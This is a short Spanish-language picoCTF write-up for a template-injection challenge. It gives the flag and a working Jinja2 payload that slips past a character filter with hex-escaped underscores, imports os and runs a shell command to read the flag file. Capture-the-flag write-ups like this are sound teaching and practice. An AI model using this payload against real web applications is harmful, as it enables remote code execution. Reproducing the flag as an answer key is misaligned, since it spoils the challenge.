## Descripción
¡Hice un sitio web genial donde puedes anunciar lo que quieras! Leí sobre la desinfección de entradas, así que ahora elimino cualquier tipo de caracteres que puedan ser un problema :)
Habrá detalles adicionales disponibles después de iniciar su instancia de desafío.
## Solución
`picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}`
## Notas adicionales
Abrimos la ruta de la instancia y colocamos: `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}` la cual nos proporciono la bandera.
## Referencias